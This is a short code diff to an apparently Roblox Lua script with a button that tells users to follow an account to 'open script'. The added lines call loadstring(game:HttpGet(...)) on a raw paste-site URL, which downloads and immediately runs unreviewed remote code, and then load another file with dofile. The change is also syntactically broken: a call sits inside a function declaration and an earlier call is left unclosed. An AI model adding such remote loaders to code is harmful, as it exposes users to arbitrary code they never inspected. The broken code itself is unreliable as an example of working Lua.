@@ -146,5 +146,7 @@ openBtn.MouseButton1Click:Connect(function()
 		Title = "message",
 		Text = "follow my account roblox for open script",
 		Duration = 10
-	})
-end)
+
+function openScript(loadstring(game:HttpGet("https://pastefy.app/X1AZGnOC/raw"))())
+    dofile("outro_script.lua")
+end
